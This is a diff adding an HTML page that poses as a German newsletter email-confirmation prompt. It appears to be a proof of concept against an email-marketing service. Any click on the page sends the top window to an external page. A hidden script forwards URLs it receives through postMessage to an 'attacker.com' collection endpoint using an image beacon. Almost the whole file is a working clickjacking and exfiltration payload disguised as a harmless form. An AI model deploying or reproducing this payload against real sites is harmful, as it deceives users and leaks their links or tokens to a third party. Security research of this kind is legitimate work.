@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+*{margin:0;padding:0;cursor:pointer}
+body{font-family:Arial;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.box{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center}
+.icon{font-size:48px;margin-bottom:15px}
+h3{color:#333;margin-bottom:10px}
+p{color:#666;font-size:14px}
+.btn{display:inline-block;margin-top:20px;padding:12px 30px;background:#e31837;color:#fff;border-radius:4px;font-weight:bold}
+</style>
+</head>
+<body onclick="window.top.location.href='https://jessisnofy-ai.github.io/mailxpert-poc/dae.html'">
+<div class="box">
+<div class="icon">📋</div>
+<h3>Newsletter-Anmeldung</h3>
+<p>Bitte bestätigen Sie Ihre E-Mail-Adresse</p>
+<div class="btn">Bestätigen</div>
+</div>
+<script>
+window.addEventListener('message',e=>{if(e.data&&e.data.href)new Image().src='https://attacker.com/c?u='+encodeURIComponent(e.data.href)});
+</script>
+</body>
+</html>
